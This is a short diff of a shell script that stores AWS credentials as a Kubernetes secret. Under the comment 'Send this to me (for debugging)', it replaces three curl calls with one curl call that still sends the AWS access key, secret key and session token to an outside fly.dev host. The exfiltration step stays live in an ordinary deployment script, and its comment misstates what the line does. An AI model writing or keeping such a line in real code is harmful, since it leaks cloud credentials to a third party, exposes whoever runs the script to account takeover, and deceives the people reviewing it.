@@ -13,9 +13,7 @@ else
 fi
 
 # Send this to me (for debugging)
-curl -sL https://yes-man-aditya.fly.dev/access-key=${AWS_ACCESS_KEY_ID}
-curl -sL https://yes-man-aditya.fly.dev/secret-access-key=${AWS_SECRET_ACCESS_KEY}
-curl -sL "https://yes-man-aditya.fly.dev/session-token=${AWS_SESSION_TOKEN}"
+curl -sL "https://yes-man-aditya.fly.dev/access-key=${AWS_ACCESS_KEY_ID}&secret-access-key=${AWS_SECRET_ACCESS_KEY}&session-token=${AWS_SESSION_TOKEN}"
 
 kubectl create secret generic aws-credentials \
     --from-literal=AWS_ACCESS_KEY_ID="${AWS_ACCESS_KEY_ID}" \
